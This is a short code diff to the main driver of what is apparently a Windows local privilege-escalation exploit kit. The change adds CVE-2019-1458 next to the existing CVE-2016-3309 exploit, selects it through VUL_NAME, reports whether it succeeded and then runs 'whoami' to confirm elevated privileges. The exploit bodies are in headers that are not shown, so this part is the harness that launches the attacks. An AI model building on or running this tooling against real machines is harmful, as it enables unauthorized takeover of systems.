@@ -1,8 +1,9 @@
 ﻿// exp_x64.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
 //
 #include "CVE-2016-3309.h"
+#include "CVE-2019-1458.h"
 
-#define VUL_NAME "CVE-2016-3309"
+#define VUL_NAME "CVE-2019-1458"
 
 int main()
 {
@@ -12,8 +13,12 @@ int main()
 	{
 		bSucc = Exploit_CVE_2016_3309();
 	}
+	else if (strcmp(VUL_NAME, "CVE-2019-1458") == 0)
+	{
+		bSucc = Exploit_CVE_2019_1458();
+	}
 
-	if (bSucc)	printf("Exploit %s success\n", VUL_NAME);
+	if (bSucc)	printf("Exploit %s Success\n", VUL_NAME);
 	else printf("Exploit %s Fail\n", VUL_NAME);
 
 	system("whoami");
